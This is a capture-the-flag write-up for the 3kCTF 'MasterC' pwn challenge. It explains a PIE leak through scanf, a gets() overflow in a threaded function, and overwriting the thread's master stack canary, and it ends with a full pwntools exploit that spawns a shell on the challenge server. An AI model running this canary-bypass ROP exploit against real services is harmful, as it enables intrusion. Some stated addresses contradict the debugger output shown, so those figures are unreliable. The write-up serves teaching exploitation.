---
title: 3kCTF - MasterC (pwn)
date: 2021-05-20T00:00:00Z
draft: false
description: stack canary, master canary
tocOpen: true
---

> Threaded win? is that even a thing?
>
> nc masterc.2021.3k.ctf.to 9999
>
> Attachment: [masterc.tgz](attachments/masterc.tgz)


## Overview
---
We are provided with the libc, ld, source code and the binary itself.

Running `checksec` on the binary, we see all security features green

```
[*] '/media/sf_dabian/Challenges/3kctf/masterc/masterc/bin/masterc'

    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

`Enter the size : `

`Enter the number of tries : `

`Enter your guess : `

We are prompted with 3 inputs upon running the binary.

Looking at the source code,

```c
void get_ul(unsigned long* num) {
	fflush(stdout);
	scanf("%lu", num);
	readuntil('\n');
}

unsigned long play_game() {
	static int counter;
	unsigned long r, guess;

	r = rand();

	printf("Enter your guess : ");
	get_ul(&guess);

	if(r == guess) {
		printf("win!\n");
		win();
	}

	if(counter == max_tries-1) {
		printf("Sorry, that was the last guess!\n");
		printf("You entered %lu but the right number was %lu\n", guess, r);
		return r;
	}

	counter++;

	return r;
}

int main() {

	init();
	int size = get_size();
	unsigned long* values = (unsigned long*)alloca(size*sizeof(unsigned long));

	set_number_of_tries();		

	for(int i=0; i<max_tries; i++) {
		play_game();
	}

	fflush(stdout);

	printf("I don't think you won the game if you made it until here ...\n");
	printf("But maybe a threaded win can help?\n");

	pthread_t tid;
	pthread_create(&tid, NULL, (void*)win, NULL);
	pthread_join(tid, NULL);

	return 0;
}

void win() {
	char buf[0x10];
	puts("> ");
	gets(buf);
}
```

The program logic is simple.

  1. It takes in number of tries,
  2. for the number of tries specified, it will check your guess against `rand()`
  3. If your `guess == rand()`, it calls the `win()` function, which has a `gets` call, making it vulnerable to **BOF** attacks.
  4. If your `guess != rand()`, it calls a threaded `win()` function.


## Exploitation Ideas
---

Regardless of passing the `guess == rand()` check or not, we are still granted a `win()` function, hence either ways, we will still get our **BOF vulnerability**.

#### PIE

However, `PIE` is enabled which means we will probably need a leak in order to `ROP` to win.

Looking through the source code, there is no other input which is vulnerable to **BOF** other than the `gets()` call in `win()`.

Looking at how our input is taken in and whether it's `printed/puts` later in the function, we arrive at `scanf("%lu", num);` in `get_ul(unsigned long* num)` in `play_game()`.

Our input of type `long-unsigned` is saved to `guess`, which is then printed out when we lose the game.

```c
if(counter == max_tries-1) {
  printf("Sorry, that was the last guess!\n");
  printf("You entered %lu but the right number was %lu\n", guess, r);
  return r;
}
```

Our input is taken in as a `long-unsigned` and printed as a `long-unsigned`.

This allows us to leak an address since our print is not null-terminated, and our input does not accept any other types other than a `long-unsigned`.

If we input a `char` for example, our `scanf("%lu", num)` will not take in any parameters, and will instead print `long-unsigned` of whatever is at that address, which gives us our leak.

#### Canary

Even with an `elf` leak, we still have a canary to bypass.

However, there are **0** format-string exploits in this binary, nor is there anyway we can leak anything other than our `elf` function address.

That brings a question of whether the thread even matters or not?

Running the binary in GDB, we note that our threaded function gets a stack frame far from our initial stack.

Also noting the hint in the challenge name, `masterc` = `master canary?`.

Could we possibly define our own canary by overwriting the master canary which it compares against?

This could be possible with our new stack frame as we are now much closer to the master canary.


## Exploitation

First, we find out what function address we are leaking when we exploit our `scanf("%lu")`.

We run masterc in gdb and input a symbol as our `guess`.

```
Enter the size : 1
Enter the number of tries : 1
Enter your guess : +

Sorry, that was the last guess!
You entered 93824992236921 but the right number was 1636372323
```

As you can see, our leak came out. Let's examine our leak and find out what function address it is.

```
pwndbg> x/gx 93824992236921
0x555555555579 <set_number_of_tries+39>:	0x7800fc7d83fc4589
```

As you can see, our leak is at `<set_number_of_tries+39>`. With that knowledge we can craft the first stage of our exploit.

```py
from pwn import *

p = process('masterc')
libc = ELF('libc-2.31.so')
context.binary = elf = ELF('masterc')

p.sendline(b'1')
p.sendline(b'1')
p.sendline(b'A')
p.recvuntil('You entered ')
leak = int(p.recvuntil(' ').strip())

setnotries = leak - 39
elf.address = setnotries - elf.sym.set_number_of_tries

log.info(f"Elf base: {hex(elf.address)}")
log.info(f"Leak: {hex(leak)}")
```

Next, we exploit our master canary.

We run our binary in gdb once again, and run until we reach our threaded win function.

Printing enough values on the stack, we find our input canary which limits our `gets()`.

```
pwndbg> stack 21

00:0000│ rsp 0x7ffff7dc3ef8 —▸ 0x7ffff7f95ea7 (start_thread+215)
01:0008│     0x7ffff7dc3f00 ◂— 0x0
02:0010│     0x7ffff7dc3f08 —▸ 0x7ffff7dc4700 ◂— 0x7ffff7dc4700
03:0018│     0x7ffff7dc3f10 —▸ 0x7ffff7dc4700 ◂— 0x7ffff7dc4700
04:0020│     0x7ffff7dc3f18 ◂— 0xf330b7fc5cc53fed
05:0028│     0x7ffff7dc3f20 —▸ 0x7fffffffe4ae ◂— 0x100
06:0030│     0x7ffff7dc3f28 —▸ 0x7fffffffe4af ◂— 0x1
07:0038│     0x7ffff7dc3f30 —▸ 0x7ffff7dc3fc0 ◂— 0x0
08:0040│     0x7ffff7dc3f38 ◂— 0x802000
09:0048│     0x7ffff7dc3f40 ◂— 0xccf584422c53fed
0a:0050│     0x7ffff7dc3f48 ◂— 0xccf580ee05f3fed
0b:0058│     0x7ffff7dc3f50 ◂— 0x0
... ↓        8 skipped
14:00a0│     0x7ffff7dc3f98 ◂— 0x25fc24ba22307b00 #our canary is here
```

We can see that our canary _(easily identifiable due to the null byte)_ is at `0x7ffff7dc3ee8`.

Let's now find our master canary. After a few ``ni`` prompts in GDB, we find ourselves at the canary comparison.

```
0x555555555473 <win+61>    xor    rax, qword ptr fs:[0x28]
0x55555555547c <win+70>    je     win+77 <win+77>

0x55555555547e <win+72>    call   __stack_chk_fail@plt <__stack_chk_fail@plt>
```

This compares our input canary with the master canary at `fs_base + 0x28`.

Since we want to overwrite the master canary, we have to find the offset of master canary from our input. Hence we need the address of the master canary.

We can easily do that in GDB:

```
pwndbg> x/1xg $fs_base+0x28

0x7ffff7dc4728:	0x25fc24ba22307b00
```

where our address of master canary is `0x7ffff7dc4728`.

Doing some calculations we get our canary and master canary offset from our input.

`Input: 0x7ffff7dc3ed0`

`Offset to canary: 0x7ffff7dc3ee8 - 0x7ffff7dc3ed0 = 24`

`Offset to master canary: 0x7ffff7dc4728 - 0x7ffff7dc3ed0 = 2136`

With that, we can overwrite our canary and now we have ourselves a simple ROP to win.

_ret2system did not work for this challenge, possibly due to the threaded function, but presence of a syscall gadget allows us to simply SIGROP execve_


## Final Script
---

```py
from pwn import *

p = remote('masterc.2021.3k.ctf.to', 9999)
libc = ELF('libc-2.31.so')
context.binary = elf = ELF('masterc')

p.sendline(b'1')
p.sendline(b'1')
p.sendline(b'A')
p.recvuntil('You entered ')
leak = int(p.recvuntil(' ').strip())

setnotries = leak - 39
elf.address = setnotries - elf.sym.set_number_of_tries

log.info(f"Elf base: {hex(elf.address)}")
log.info(f"Leak: {hex(leak)}")

fake_canary = b'A'*8

rop = ROP(elf)
rop.call(rop.ret[0])
rop.puts(elf.got.puts) # leak libc address to bypass libc ASLR
rop.win()

p.sendline(flat({ 24: fake_canary, 40: rop.chain(), 2136: fake_canary}))

p.recvuntil('> \n')
putsleak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = putsleak - libc.sym.puts # calculate libc base address
binsh = next(libc.search(b'/bin/sh'))

log.info(f"Puts: {hex(putsleak)}")
log.info(f"Libc base: {hex(libc.address)}")

rop = ROP([libc, elf])
rop.call(rop.ret[0])
rop.execve(binsh, 0, 0)

p.sendlineafter('> ', flat({24: fake_canary, 40: rop.chain()}))
p.interactive()
```

---

**3k{WH47_Pr3V3N7_Y0U_Fr0M_r0PP1N6_1F_Y0U_C4N_0V3rWr173_7H3_M4573r_C4N4rY_17531F}**

---

_credits to **[violenttestpen](https://violenttestpen.github.io)** and **[niktay](https://dystopia.sg)** for some of the concepts and techniques here. go check them out!!_
